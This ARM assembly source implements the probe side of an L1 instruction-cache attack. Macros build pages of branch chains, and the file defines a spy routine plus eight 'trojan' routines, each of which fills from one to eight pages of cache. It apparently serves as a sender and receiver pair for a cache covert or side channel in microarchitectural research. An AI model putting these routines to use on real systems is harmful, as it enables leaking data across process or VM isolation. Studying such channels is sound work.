#the L1i probe attack with branch instructions on arm machine 

#32K L1 cache, 32 b/line, 1024 lines 


.text

#define BRANCH_LINE() \
    b .+32; \
    mov r0, r0;\
    mov r0, r0;\
    mov r0, r0;\
    mov r0, r0;\
    mov r0, r0;\
    mov r0, r0;\
    mov r0, r0;\
.align 5 ;

#define BRANCH_LINE_4() \
        BRANCH_LINE() \
        BRANCH_LINE() \
        BRANCH_LINE() \
        BRANCH_LINE()

#define BRANCH_LINE_16() \
        BRANCH_LINE_4() \
        BRANCH_LINE_4() \
        BRANCH_LINE_4() \
        BRANCH_LINE_4() 

#define BRANCH_LINE_64() \
        BRANCH_LINE_16() \
        BRANCH_LINE_16() \
        BRANCH_LINE_16() \
        BRANCH_LINE_16()


#define BRANCH_PAGE() \
        BRANCH_LINE_64() \
        BRANCH_LINE_64() 


.align 12 
.global arm_branch_spy 
arm_branch_spy:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_1
arm_branch_trojan_1:
BRANCH_PAGE()
    bx lr 

.align 12 
.global arm_branch_trojan_2
arm_branch_trojan_2:
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_3
arm_branch_trojan_3:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_4
arm_branch_trojan_4:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_5
arm_branch_trojan_5:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_6
arm_branch_trojan_6:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_7
arm_branch_trojan_7:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr

.align 12 
.global arm_branch_trojan_8
arm_branch_trojan_8:
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
BRANCH_PAGE()
    bx lr
